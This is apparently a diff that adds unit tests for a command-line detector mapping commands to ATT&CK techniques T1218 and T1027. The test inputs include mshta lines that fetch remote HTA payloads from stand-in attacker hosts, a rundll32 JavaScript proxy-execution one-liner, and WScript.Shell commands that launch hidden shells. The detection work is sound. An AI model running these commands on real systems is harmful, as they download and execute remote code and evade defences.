@@ -4,6 +4,8 @@ Unit tests for core.detector module.
 Tests cover:
 1. score_confidence() - confidence scoring based on evidence
 2. detect_t1059() - T1059 technique detection (Command and Scripting Interpreter)
+3. detect_t1218() - T1218 technique detection (System Binary Proxy Execution)
+4. detect_t1027() - T1027 technique detection (Obfuscated Files or Information)
 
 Scoring formula:
 - Base confidence + evidence count bonus (0.06 per item, max 4)
@@ -20,7 +22,7 @@ from pathlib import Path
 src_root = Path(__file__).resolve().parent.parent / "src"
 sys.path.insert(0, str(src_root))
 
-from core.detector import score_confidence, detect_t1059
+from core.detector import score_confidence, detect_t1059, detect_t1218, detect_t1027
 
 
 def test_score_confidence_zero_evidence():
@@ -295,10 +297,208 @@ def test_detect_t1059_indirect_cmd_execution():
     # May also have T1059.003 for cmd.exe execution depending on pattern matching
 
 
+# ===== detect_t1218 Tests =====
+
+def test_detect_t1218_mshta_proxy():
+    """Test T1218.005 detection with basic mshta proxy execution."""
+    cmd = "mshta.exe http://malicious.com/payload.hta"
+    detections = detect_t1218(cmd)
+    
+    # Should detect T1218.005 (Mshta)
+    assert len(detections) > 0
+    mshta_detection = next((d for d in detections if d['subtechnique_id'] == 'T1218.005'), None)
+    assert mshta_detection is not None
+    assert mshta_detection['technique_id'] == 'T1218'
+    assert 'Mshta' in mshta_detection['subtechnique']
+
+
+def test_detect_t1218_mshta_activex():
+    """Test T1218.001 detection with mshta ActiveX usage."""
+    cmd = "mshta.exe javascript:var s=new ActiveXObject('MSXML2.XMLHTTP')"
+    detections = detect_t1218(cmd)
+    
+    # Should detect T1218.001 (script protocol with ActiveX)
+    activex_detection = next((d for d in detections if d['subtechnique_id'] == 'T1218.001'), None)
+    assert activex_detection is not None
+    assert activex_detection['technique_id'] == 'T1218'
+    assert len(activex_detection['evidence']) > 0
+
+
+def test_detect_t1218_rundll32():
+    """Test T1218.011 detection with rundll32 JavaScript execution."""
+    cmd = 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"'
+    detections = detect_t1218(cmd)
+    
+    # Should detect T1218.011 (Rundll32)
+    assert len(detections) > 0
+    technique_ids = [d['subtechnique_id'] for d in detections]
+    assert any('T1218' in tid for tid in technique_ids)
+
+
+def test_detect_t1218_evidence_extraction():
+    """Test that T1218 evidence is properly extracted."""
+    cmd = "mshta.exe javascript:var x=new ActiveXObject('WScript.Shell');x.Run('cmd.exe',0)"
+    detections = detect_t1218(cmd)
+    
+    # Should have detections with evidence
+    assert len(detections) > 0
+    for detection in detections:
+        assert 'evidence' in detection
+        assert len(detection['evidence']) > 0
+
+
+def test_detect_t1218_no_detections():
+    """Test that non-proxy-execution commands produce no T1218 detections."""
+    cmd = "notepad.exe"
+    detections = detect_t1218(cmd)
+    
+    # Should produce no detections
+    assert len(detections) == 0
+
+
+def test_detect_t1218_output_structure():
+    """Test that T1218 detection output has correct structure."""
+    cmd = "mshta.exe vbscript:CreateObject('WScript.Shell')"
+    detections = detect_t1218(cmd)
+    
+    assert len(detections) > 0
+    detection = detections[0]
+    
+    # Verify required keys
+    assert 'technique_id' in detection
+    assert 'technique' in detection
+    assert 'subtechnique_id' in detection
+    assert 'subtechnique' in detection
+    assert 'tactic' in detection
+    assert 'behavior' in detection
+    assert 'attacker_intent' in detection
+    assert 'confidence' in detection
+    assert 'evidence' in detection
+    assert 'defensive_enrichment' in detection
+    
+    # Verify technique is T1218
+    assert detection['technique_id'] == 'T1218'
+    assert isinstance(detection['confidence'], float)
+    assert 0.0 <= detection['confidence'] <= 1.0
+
+
+def test_detect_t1218_mshta_network():
+    """Test T1218.005 detection with network-based mshta."""
+    cmd = "mshta.exe https://attacker.com/evil.hta"
+    detections = detect_t1218(cmd)
+    
+    # Should detect mshta proxy execution
+    assert len(detections) > 0
+    mshta_detection = next((d for d in detections if 'T1218.005' in d['subtechnique_id']), None)
+    assert mshta_detection is not None
+
+
+def test_detect_t1218_multiple_patterns():
+    """Test that multiple T1218 patterns can be detected in one command."""
+    cmd = "mshta.exe javascript:var s=new ActiveXObject('WScript.Shell');s.Run('rundll32.exe',0)"
+    detections = detect_t1218(cmd)
+    
+    # Should detect multiple T1218 patterns
+    assert len(detections) >= 1
+    technique_ids = [d['technique_id'] for d in detections]
+    assert all(tid == 'T1218' for tid in technique_ids)
+
+
+# ===== detect_t1027 Tests =====
+
+def test_detect_t1027_packing_tools():
+    """Test T1027.002 detection with software packing tools."""
+    cmd = "upx malware.exe"
+    detections = detect_t1027(cmd)
+    
+    # Should detect T1027.002 (Software Packing)
+    assert len(detections) > 0
+    obf_detection = next((d for d in detections if d['technique_id'] == 'T1027'), None)
+    assert obf_detection is not None
+
+
+def test_detect_t1027_steganography():
+    """Test T1027.003 detection with steganography tools."""
+    cmd = "steghide embed image.png"
+    detections = detect_t1027(cmd)
+    
+    # Should detect T1027.003 (Steganography)
+    assert len(detections) > 0
+    obf_detection = next((d for d in detections if d['technique_id'] == 'T1027'), None)
+    assert obf_detection is not None
+
+
+def test_detect_t1027_string_concat():
+    """Test T1027 detection with string concatenation obfuscation."""
+    cmd = "mshta.exe javascript:var p='po'+'wer'+'shell'"
+    detections = detect_t1027(cmd)
+    
+    # String concatenation patterns may or may not trigger T1027 depending on pattern implementation
+    # This is a soft test - if it detects, verify structure
+    if len(detections) > 0:
+        assert any(d['technique_id'] == 'T1027' for d in detections)
+
+
+def test_detect_t1027_no_detections():
+    """Test that plain commands produce no T1027 detections."""
+    cmd = "cmd.exe /c dir"
+    detections = detect_t1027(cmd)
+    
+    # Should produce no detections
+    assert len(detections) == 0
+
+
+def test_detect_t1027_evidence_extraction():
+    """Test that T1027 evidence is properly extracted."""
+    cmd = "upx -9 malware.exe"
+    detections = detect_t1027(cmd)
+    
+    # Should have detections with evidence
+    if len(detections) > 0:
+        for detection in detections:
+            assert 'evidence' in detection
+            assert isinstance(detection['evidence'], list)
+
+
+def test_detect_t1027_output_structure():
+    """Test that T1027 detection output has correct structure."""
+    cmd = "themida protect.exe"
+    detections = detect_t1027(cmd)
+    
+    if len(detections) > 0:
+        detection = detections[0]
+        
+        # Verify required keys
+        assert 'technique_id' in detection
+        assert 'technique' in detection
+        assert 'tactic' in detection
+        assert 'behavior' in detection
+        assert 'attacker_intent' in detection
+        assert 'confidence' in detection
+        assert 'evidence' in detection
+        
+        # Verify technique is T1027
+        assert detection['technique_id'] == 'T1027'
+        assert isinstance(detection['confidence'], float)
+        assert 0.0 <= detection['confidence'] <= 1.0
+
+
+def test_detect_t1027_confidence_with_evidence():
+    """Test that T1027 confidence scoring works correctly."""
+    cmd = "upx malware.exe"
+    detections = detect_t1027(cmd)
+    
+    if len(detections) > 0:
+        detection = detections[0]
+        # Confidence should be reasonable (between 0.5 and 1.0 for clear obfuscation)
+        assert detection['confidence'] >= 0.5
+        assert detection['confidence'] <= 1.0
+
+
 if __name__ == "__main__":
     # Simple test runner
     test_functions = [
-        # score_confidence tests
+        # score_confidence tests (14)
         test_score_confidence_zero_evidence,
         test_score_confidence_single_evidence,
         test_score_confidence_duplicate_evidence,
@@ -313,7 +513,7 @@ if __name__ == "__main__":
         test_score_confidence_category_diversity_cap,
         test_score_confidence_progression,
         test_score_confidence_mixed_generic_non_generic,
-        # detect_t1059 tests
+        # detect_t1059 tests (10)
         test_detect_t1059_mshta_javascript,
         test_detect_t1059_mshta_vbscript,
         test_detect_t1059_cmd_execution,
@@ -324,6 +524,23 @@ if __name__ == "__main__":
         test_detect_t1059_output_structure,
         test_detect_t1059_mshta_suppression,
         test_detect_t1059_indirect_cmd_execution,
+        # detect_t1218 tests (9)
+        test_detect_t1218_mshta_proxy,
+        test_detect_t1218_mshta_activex,
+        test_detect_t1218_rundll32,
+        test_detect_t1218_evidence_extraction,
+        test_detect_t1218_no_detections,
+        test_detect_t1218_output_structure,
+        test_detect_t1218_mshta_network,
+        test_detect_t1218_multiple_patterns,
+        # detect_t1027 tests (7)
+        test_detect_t1027_packing_tools,
+        test_detect_t1027_steganography,
+        test_detect_t1027_string_concat,
+        test_detect_t1027_no_detections,
+        test_detect_t1027_evidence_extraction,
+        test_detect_t1027_output_structure,
+        test_detect_t1027_confidence_with_evidence,
     ]
     
     passed = 0
